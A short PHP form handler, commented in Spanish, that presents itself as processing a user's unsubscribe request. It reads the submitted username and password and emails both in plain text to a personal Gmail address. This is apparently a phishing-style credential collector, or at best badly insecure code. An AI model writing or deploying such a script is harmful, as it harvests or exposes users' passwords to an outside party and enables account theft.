<?php

// Recibe los datos del formulario
$usuario = $_POST['usuario'];
$contrasena = $_POST['contrasena'];

// Datos del administrador
$admin_email = "carldres004@gmail.com";

// Asunto y contenido del correo electrónico
$subject = "Solicitud de baja de usuario";
$message = "El usuario '$usuario' ha solicitado darse de baja. Contraseña: '$contrasena'";

// Envío del correo electrónico
if (mail($admin_email, $subject, $message)) {
    echo "Correo electrónico enviado exitosamente al administrador.";
} else {
    echo "Error al enviar el correo electrónico.";
}
?>